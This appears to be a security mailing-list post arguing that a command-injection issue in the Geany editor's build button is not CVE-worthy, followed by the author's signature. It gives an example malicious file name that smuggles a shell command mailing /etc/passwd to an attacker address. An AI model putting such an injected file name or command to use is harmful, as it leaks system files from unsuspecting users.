The way to get someone to trigger this is to send a source-file to a developer who then opens it in geany without realizing that the file is named "mail evil@...kdom.com -s teehee < /etc/passwd". The "attacked" developer then need to attempt to build it from geany's internal "build now" button.  A simpler misdeed of similar charactaristics would be to ship a bogus ./configure script that people (who are not developers, mind you) blindly run and which executes bogus commands on behalf of the logged in user.  Since the latter isn't really CVE-worthy, I doubt the former even comes close.  --  Andreas Ericsson                   andreas.ericsson@....se OP5 AB                             www.op5.se Tel: +46                  Fax: +46  Considering the successes of the wars on alcohol, poverty, drugs and terror, I think we should give some serious thought to declaring war on peace.
